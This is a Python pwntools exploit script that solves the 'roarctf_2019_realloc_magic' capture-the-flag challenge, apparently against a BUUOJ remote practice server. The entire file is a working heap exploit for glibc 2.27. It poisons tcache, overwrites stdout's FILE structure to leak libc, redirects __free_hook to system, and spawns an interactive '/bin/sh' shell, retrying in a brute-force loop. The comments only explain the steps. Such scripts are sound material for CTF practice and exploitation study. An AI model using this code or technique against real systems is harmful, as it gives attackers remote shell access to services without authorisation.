from pwn import *

pn = './roarctf_2019_realloc_magic'

elf = ELF(pn)
libc = ELF('libc-2.27.buu.so')

flag = True

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def realloc(size, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Size?\n', str(size).encode())
    p.sendafter(b'Content?\n', content)

def delete():
    p.sendlineafter(b'>> ', b'2')

def exp():
    realloc(0x70, b'a') #0
    realloc(0, b'')
    realloc(0x100, b'a') #1
    realloc(0, b'')
    realloc(0xa0, b'a') #2
    realloc(0, b'')


    realloc(0x100, b'a') #1

    #fill tcache bins of 0x110
    [delete() for i in range(7)]

    #to unsorted bin
    realloc(0, b'') #chunk1's fd -> main_arena + 0x58

    #overwrite fd of chunk1 to _IO_2_1_stdout_, the low 2bytes of stdout is 0x?760 in libc
    #we don't know ?, so we should to brute it
    #in the same time ,we should change size of chunk1 to 0x41
    realloc(0x70, b'a')
    realloc(0x180, b'a' * 0x78 + p64(0x41) + b'\x60\x87')
    realloc(0, b'')

    #alloc chunk1 and free it, it will be placed in tcache bins of 0x50, so that we can alloc IO_2_1_stdout_
    realloc(0x100, b'\x60\x87')
    realloc(0, b'')

    #alloc _IO_2_1_stdout_ and change _IO_write_base's low 1 byte to 0x58, so that we could leak libc
    #0xfbad2887 works sometime, 0xfbad1887 works sometime.....
    realloc(0x100, p64(0xfbad1887) + p64(0) * 3 + b'\x58')

    libc_base = u64(p.recvuntil(b'\x7f', timeout = 0.1)[-6:].ljust(8, b'\x00')) - libc.sym['_IO_file_jumps']

    if libc_base == -libc.sym['_IO_file_jumps']:
        raise Exception('')

    global flag
    flag = False
    success('libc_base -> {}'.format(hex(libc_base)))

    #overwrite free_hook to system
    system = libc_base + libc.sym['system']
    free_hook = libc_base + libc.sym['__free_hook']

    p.sendafter(b'>> ', b'666')
    
    realloc(0x120, b'a') #3
    realloc(0, b'')
    realloc(0x130, b'a') #4
    realloc(0, b'')
    realloc(0x140, b'a') #5
    realloc(0, b'')

    realloc(0x130, b'a')
    #fill tcache of 0x140
    [delete() for i in range(7)]

    #to unsorted bin
    realloc(0, b'')

    realloc(0x120, b'a')
    #glibc will search unsorted bin to find a appropriate chunk, and merge it to 0x90's chunk
    realloc(0x260, b'a' * 0x128 + p64(0x51) + p64(free_hook))
    #free it to tcache bins of 0x270
    realloc(0, b'')
    realloc(0x130, b'a')
    realloc(0, b'')
    realloc(0x130, p64(system))
    realloc(0, b'')
    realloc(0x190, b'/bin/sh\x00')
    delete()

    p.interactive()

while flag:
    #p = process(pn)
    p = remote('node4.buuoj.cn', 25255)
    try:
        exp()
    except:
        p.close()